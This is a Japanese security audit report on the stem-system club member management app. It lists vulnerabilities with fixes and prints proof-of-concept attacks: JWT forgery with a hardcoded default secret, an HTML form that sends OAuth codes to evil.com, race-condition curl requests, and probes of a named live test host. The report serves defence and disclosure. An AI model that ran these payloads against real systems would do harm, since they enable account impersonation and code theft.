# SPECA Security Audit Report: stem-system (Clubhouse Manager)

**対象**: https://github.com/ganondorofu/stem-system
**テスト環境**: https://member.stemask.com
**監査日**: 2026-04-05
**コミット**: `31d242b7`
**パイプライン**: SPECA Phase 01a → 01b → 01e → 02c → 03 → 04
**コスト**: $26.72 (Phase 03: $17.36 が最大)

---

## Executive Summary

STEM研究部の部員管理システム (Next.js 15 + Supabase + Discord OAuth) に対する自動セキュリティ監査を実施。
**86件のセキュリティプロパティ** を生成・検証し、Phase 04 (3-Gate FPフィルタ) 通過後の最終結果:

| 判定 | 件数 |
|------|------|
| **CONFIRMED_VULNERABILITY** | **16件** |
| **CONFIRMED_POTENTIAL** | **10件** |
| PASS_THROUGH (問題なし) | 53件 |

---

## Critical Findings (3件)

### VULN-001: JWT秘密鍵のハードコードデフォルト値
- **深刻度**: Critical
- **ファイル**: `src/lib/oauth.ts:11`
- **プロパティ**: PROP-stem-system-inv-001, PROP-stem-system-pre-009, PROP-oauth-2-0-ut-pre-001

**問題**: JWT_SECRET が環境変数未設定時に `'your-secret-key-change-in-production'` にフォールバックする。

```typescript
const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-change-in-production';
```

**攻撃シナリオ**: デプロイ時に `JWT_SECRET` 環境変数が未設定の場合、攻撃者はこの公開されたデフォルト値を使って任意のJWTを偽造し、任意ユーザーになりすませる。

**PoC**:
```bash
# デフォルトキーでJWTを偽造
node -e "
const jwt = require('jsonwebtoken');
const token = jwt.sign(
  { sub: 'target-user-id', display_name: 'Attacker', scope: 'openid profile' },
  'your-secret-key-change-in-production',
  { algorithm: 'HS256', expiresIn: '30d', issuer: 'https://member.stemask.com' }
);
console.log(token);
"
# このトークンで /oauth/userinfo にアクセス
curl -H "Authorization: Bearer <forged-token>" https://member.stemask.com/oauth/userinfo
```

**修正案**: 起動時に `JWT_SECRET` 未設定なら `throw` で停止させる:
```typescript
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET) throw new Error('JWT_SECRET environment variable is required');
```

---

### VULN-002: 認証なしServer Action (情報漏洩 + 未認証操作)
- **深刻度**: Critical
- **ファイル**: `src/lib/actions/members.ts`, `src/lib/actions/generations.ts`
- **プロパティ**: PROP-stem-system-pre-001

**問題**: 3つのServer Actionが `supabase.auth.getUser()` を呼ばずにエクスポートされている:
- `getAllMemberNames` — 全部員のUID→名前マップを返す
- `getMemberDisplayName` — 任意UIDの表示名を返す
- `ensureGenerationRoleExists` — 未認証でDiscordロール作成可能

**攻撃シナリオ**: Next.js Server ActionのIDはビルド済みJSバンドルから抽出可能。攻撃者は直接HTTPリクエストで認証なしに部員情報を取得できる。

**PoC**:
```bash
# Next.js Server Action を直接呼び出し (Action IDはビルドJSから抽出)
curl -X POST https://member.stemask.com/ \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Next-Action: <extracted-action-id>" \
  --data ""
```

**修正案**: 各関数の先頭に認証チェックを追加:
```typescript
export async function getAllMemberNames() {
  const supabase = await createClient();
  const { data: { user } } = await supabase.auth.getUser();
  if (!user) throw new Error('Unauthorized');
  // ... existing logic
}
```

---

### VULN-003: Server Action入力バリデーション欠如 (6関数)
- **深刻度**: Critical
- **ファイル**: `src/lib/actions/members.ts`, `src/lib/actions/teams.ts`
- **プロパティ**: PROP-stem-system-inv-004, PROP-stem-system-pre-012

**問題**: 6つのDB変更Server Actionが Zod safeParse をバイパス:
- `toggleAdminStatus` — 管理者権限の切り替え
- `deleteMember` — 部員削除
- `updateMemberTeams` — チーム割り当て
- `updateStatusesForNewAcademicYear` — 一括ステータス変更 (未検証の generation 番号使用)
- `deleteTeam` — チーム削除
- `updateTeamLeaders` — リーダー変更

**修正案**: 全関数にZodスキーマによる入力検証を追加。

---

## High Findings (5件)

### VULN-004: OAuth redirect_uri 未検証 (オープンリダイレクト + 認可コード窃取)
- **深刻度**: High
- **ファイル**: `src/app/oauth/authorize/consent/actions.ts:19`
- **プロパティ**: PROP-stem-system-inv-003, PROP-stem-system-inv-004

**問題**: `handleConsent` が FormData から `redirect_uri` を読み取るが、`isValidRedirectUri` による検証を行わない。`GET /oauth/authorize` での検証はバイパス可能。

**攻撃シナリオ**: 
1. 攻撃者がconsentページに直接アクセス (ミドルウェアはルーティングガードなし)
2. hidden フィールドの `redirect_uri` を `https://evil.com/callback` に改ざん
3. 認可コードが攻撃者のサーバーにリダイレクトされる
4. 攻撃者がコードをトークンに交換し、被害者のアカウントにアクセス

**PoC**:
```html
<!-- 攻撃者のページ: consent formを直接POST -->
<form action="https://member.stemask.com/oauth/authorize/consent" method="POST">
  <input type="hidden" name="action" value="approve">
  <input type="hidden" name="client_id" value="legitimate-client-id">
  <input type="hidden" name="redirect_uri" value="https://evil.com/steal">
  <input type="hidden" name="state" value="random">
  <input type="hidden" name="scope" value="openid profile">
  <button>Login with STEM</button>
</form>
```

**修正案**: `handleConsent` 内で `redirect_uri` をDB上の登録済みURIと照合:
```typescript
const registeredUris = application.redirect_uris; // DB から取得
if (!registeredUris.includes(redirectUri)) {
  throw new Error('Invalid redirect_uri');
}
```

---

### VULN-005: 認可コード二重使用 (TOCTOU レース)
- **深刻度**: High
- **ファイル**: `src/app/oauth/token/route.ts`
- **プロパティ**: PROP-stem-system-inv-002, PROP-stem-system-post-001

**問題**: SELECT (認可コード取得) と DELETE (認可コード削除) が非アトミック。並行リクエストで同一コードから複数トークン発行可能。

**PoC**:
```bash
# 同一認可コードで同時リクエスト
CODE="stolen-auth-code"
curl -X POST https://member.stemask.com/oauth/token \
  -d "grant_type=authorization_code&code=$CODE&..." &
curl -X POST https://member.stemask.com/oauth/token \
  -d "grant_type=authorization_code&code=$CODE&..." &
wait
# 両方がJWTを返す可能性
```

**修正案**: DB側で `DELETE ... RETURNING *` を使い、アトミックに取得+削除:
```sql
CREATE FUNCTION exchange_authorization_code(p_code TEXT)
RETURNS TABLE(...) AS $$
  DELETE FROM authorization_codes WHERE code = p_code RETURNING *;
$$ LANGUAGE sql;
```

---

### VULN-006: 公開APIエンドポイントの認証不備
- **深刻度**: High
- **ファイル**: `src/middleware.ts:51`, `src/app/api/auth/debug/route.ts`
- **プロパティ**: PROP-stem-system-pre-007

**問題**: ミドルウェアが `/api/*` ルートを認証から除外。`/api/auth/debug` がデバッグ情報を未認証で公開。

**PoC (実証済み)**:
```bash
curl https://member.stemask.com/api/auth/debug
# → Cookie情報、認証状態、インフラヘッダーが返される
```

**修正案**: デバッグエンドポイントを削除、または開発環境限定にする。

---

### VULN-007: OAuth scopeバリデーション欠如
- **深刻度**: High
- **ファイル**: `src/app/oauth/authorize/consent/actions.ts`
- **プロパティ**: PROP-oauth-2-0-ut-inv-015

**問題**: OAuth scope パラメータがアプリケーションの許可スコープと照合されない。任意のスコープが認可コード→JWTに含まれる。

---

### VULN-008: ソフトデリート後の管理者権限残存
- **深刻度**: High
- **ファイル**: `src/lib/actions/members.ts`
- **プロパティ**: PROP-stem-system-inv-018

**問題**: `deleteMember` は `deleted_at` を設定するだけで `is_admin` をクリアしない。`checkAdmin()` クエリに `deleted_at IS NULL` フィルタがなく、削除済み管理者がセッション有効中は管理者権限を保持。

---

## Medium Findings (8件)

| ID | プロパティ | 内容 |
|----|-----------|------|
| M-01 | inv-013 | `deleteMember` が RLS で silently no-op (cookie client 使用で 0行返却) |
| M-02 | inv-017 | consent エラー無視 (認可コード発行が続行) |
| M-03 | pre-005 | `handleConsent` の redirect_uri バイパス |
| M-04 | pre-007 | deny パスの `redirectWithError` が未検証 redirect_uri で TypeError |
| M-05 | inv-016 | `updateMemberAdmin` の非アトミック delete-then-insert |
| M-06 | post-003 | OAuth cookie (`oauth_redirect`) のエラーパスでの未削除 |
| M-07 | post-002 | ソフトデリート後の team_relations 残存 |
| M-08 | post-004 | OAuth フロー全体の監査ログ欠如 |

---

## Low Findings (5件)

| ID | プロパティ | 内容 |
|----|-----------|------|
| L-01 | inv-015 | `updateTeamLeaders` の非アトミック操作 → リーダー不在リスク |
| L-02 | inv-022 | 学生番号フォーマット `/^[0-9]+$/` のバイパスパス |
| L-03 | pre-010 | `updateTeamLeaders` が所属検証なしにリーダー登録 |
| L-04 | pre-011 | `updateMemberTeams` に `deleted_at IS NULL` ガードなし |
| L-05 | asm-001 | RLS 不整合: admin操作が cookie client (RLS適用) vs updateMyProfile が admin client |

---

## 修正優先度

### 即時対応 (P0)
1. **JWT_SECRET フォールバック削除** — 起動時 throw に変更
2. **`/api/auth/debug` 削除** — 本番環境に不要
3. **handleConsent の redirect_uri 検証追加**

### 短期対応 (P1)
4. 3つの認証なし Server Action に auth チェック追加
5. 認可コード交換をアトミック化 (DELETE RETURNING)
6. 6つの Server Action に Zod 入力検証追加
7. OAuth scope のホワイトリスト検証

### 中期対応 (P2)
8. `deleteMember` を admin client に修正
9. `checkAdmin()` に `deleted_at IS NULL` 追加
10. 非アトミック操作を DB トランザクション/RPC に統合
11. OAuth 監査ログの実装

---

## PoC実行結果 (テスト環境: https://member.stemask.com)

### PoC 1: `/api/auth/debug` 情報漏洩 -- **実証成功**

```bash
$ curl -s https://member.stemask.com/api/auth/debug
```

**レスポンス**:
```json
{
  "timestamp": "2026-04-05T08:45:18.348Z",
  "cookies": {
    "total": 0,
    "names": [],
    "supabaseAuthCookies": [],
    "hasOauthRedirect": false,
    "hasOauthRedirectClient": false
  },
  "auth": {
    "hasUser": false,
    "error": "Auth session missing!"
  },
  "request": {
    "url": "https://member.stemask.com/api/auth/debug",
    "forwardedHost": "member.stemask.com",
    "forwardedProto": "https",
    "host": "member.stemask.com"
  }
}
```

**結果**: 認証なしでCookie情報、認証状態、ホスト名、プロトコル情報が漏洩。

---

### PoC 2: JWT偽造テスト -- **本番では防御済み**

```bash
# デフォルトキーでJWTを生成
$ node -e "
const jwt = require('jsonwebtoken');
const token = jwt.sign(
  { sub: 'poc-test-user', display_name: 'PoC-Attacker', scope: 'openid profile', discord_id: '000000000000' },
  'your-secret-key-change-in-production',
  { algorithm: 'HS256', expiresIn: '1h', issuer: 'https://member.stemask.com' }
);
console.log(token);
"
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJwb2MtdGVzdC11c2VyIi...

# 偽造トークンで /oauth/userinfo にアクセス
$ curl -s -H "Authorization: Bearer <forged-token>" https://member.stemask.com/oauth/userinfo
{"error":"invalid_token","error_description":"Invalid or expired access token"}
# HTTP 401
```

**結果**: 本番環境では `JWT_SECRET` が正しく設定されており、デフォルトキーでの偽造は失敗。た��しコード上のフォールバック (`|| 'your-secret-key-change-in-production'`) は依然としてリスク -- 環境変数の設定ミスで即座に脆弱になる。

---

### PoC 3: OAuth認可エンドポイントの検証

```bash
$ curl -s -D - "https://member.stemask.com/oauth/authorize?client_id=test&redirect_uri=https://evil.com/steal&response_type=code&scope=admin"
HTTP/1.1 400 Bad Request
{"error":"invalid_request","error_description":"Missing required parameters"}
```

**結果**: `GET /oauth/authorize` はパラメータ検証あり (400返却)。ただしこれは consent ペー��への直接POSTバイパスとは別経路 -- `handleConsent` Server Action が FormData の `redirect_uri` を未検証で使用する脆弱性はコードレベルで確認済み。

---

### PoC 4: `/oauth/userinfo` 認証なしアクセス

```bash
$ curl -s https://member.stemask.com/oauth/userinfo
{"error":"invalid_request","error_description":"Missing or invalid Authorization header"}
# HTTP 401
```

**結果**: Bearer トークンなしでのアクセスは正しく拒否。認証チェック自体は正常。

---

### PoC結果まとめ

| PoC | 対象 | 結果 | 深刻度 |
|-----|------|------|--------|
| 1 | `/api/auth/debug` 情報漏洩 | **実証成功** | High |
| 2 | JWT偽造 (デフォルトキー) | 本番では防御済み (コードリスクは残存) | Critical (潜在) |
| 3 | OAuth redirect_uri バイパス | コードレベル確認 (consent直接POSTで悪用可能) | High |
| 4 | `/oauth/userinfo` 認証なし | 正しく拒否 | N/A |

---

## Pipeline Statistics

| Phase | 時間 | コスト | 結果 |
|-------|------|--------|------|
| 01a Spec Discovery | 2.6分 | $0.09 | 19仕様 |
| 01b Subgraph Extraction | 9.6分 | $1.11 | 4サブグラフ |
| 01e Property Generation | 4.0分 | $1.08 | 86プロパティ |
| 02c Code Pre-resolution | 18.0分 | $3.27 | 86コード解決 |
| 03 Audit Map | 62.7分 | $17.36 | 79監査結果 |
| 04 Review | 4.6分 | $3.81 | 26レビュー結果 |
| **合計** | **~102分** | **$26.72** | **16 CONFIRMED + 10 POTENTIAL** |
